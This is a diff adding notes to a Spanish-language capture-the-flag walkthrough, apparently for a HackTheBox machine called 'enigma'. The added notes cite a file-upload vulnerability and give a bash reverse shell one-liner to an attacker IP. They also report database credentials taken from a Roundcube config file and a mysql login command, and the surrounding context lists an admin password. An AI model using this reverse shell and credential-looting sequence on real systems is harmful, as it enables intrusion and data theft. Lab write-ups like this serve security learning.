@@ -249,4 +249,23 @@ Probamos reautilizar la contraseña...
 - web: [http://support_001.enigma.htb](http://support_001.enigma.htb)
 - username: admin
 - pass: Ne3s4rtars78s
+### Vulnerabilidad 
+- [subida de archivo maliciosoh](ttps://github.com/advisories/GHSA-25fp-8w8p-mx36)
+
+```sh
+# mandamos la reverse shell, pero se urlencodea todo, hasta los simbolos especiales
+bash -c "bash -i >& /dev/tcp/10.10.17.250/443 0>&1"
+```
+
+### Luego tratamos la tty y buscamos información
+Encontramos un archivo config.ini.php en la ruta `~/html/roundcube/`
+
+### Config.ini.php 
+- link: mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail
+- user: roundcube
+
+```sh
+mysql -h localhost -P 3306 -u roundcube -p roundcubeemail
+```
+
 
